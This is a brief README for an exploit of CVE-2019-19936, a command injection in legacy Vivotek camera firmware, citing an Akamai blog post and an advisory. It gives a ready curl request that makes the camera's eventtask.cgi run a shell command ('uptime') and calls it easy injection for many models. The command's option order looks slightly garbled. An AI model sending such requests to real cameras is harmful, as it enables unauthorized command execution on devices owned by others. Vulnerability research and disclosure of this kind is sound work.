
This exploit is based off of this blog post by Larry Cashdollar
https://www.akamai.com/blog/security-research/rce-zero-day-in-legacy-vivotek-firmware
and http://www.vapidlabs.com/advisory.php?v=218

CVE-2019-19936 

$ curl -d -v "method=exec&file=uptime" http://target/cgi-bin/admin/eventtask.cgi

Easy command injection for many legacy Vivotek camera models.
